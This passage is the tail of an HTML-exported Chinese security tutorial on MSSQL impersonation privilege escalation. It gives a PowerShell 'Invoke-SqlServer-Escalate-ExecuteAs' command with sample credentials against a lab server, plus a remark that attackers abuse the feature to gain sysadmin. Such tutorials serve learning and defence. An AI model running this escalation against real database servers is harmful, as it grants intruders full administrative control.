class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e6%a8%a1%e6%8b%9f%e7%99%bb%e5%bd%95%e6%8f%90%e6%9d%83_files/image8.png" width="560" height="307" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">Invoke-SqlServer-Escalate-ExecuteAs -SqlUser MyUser1 -SqlPass MyPassword! -SqlServerInstance WIN-80LVKKRM5UA</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Mssql/Mssql%20%e6%a8%a1%e6%8b%9f%e7%99%bb%e5%bd%95%e6%8f%90%e6%9d%83_files/image9.png" width="560" height="218" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">总的来说，利用这个来提权也不算是漏洞，毕竟可能是运维人员想要的正常功能，然后被攻击者利用，达到提权</span><span class="cs8926E06">sysadmin</span><span class="cs9C1B1871">的目的。</span></p></body>
</html>
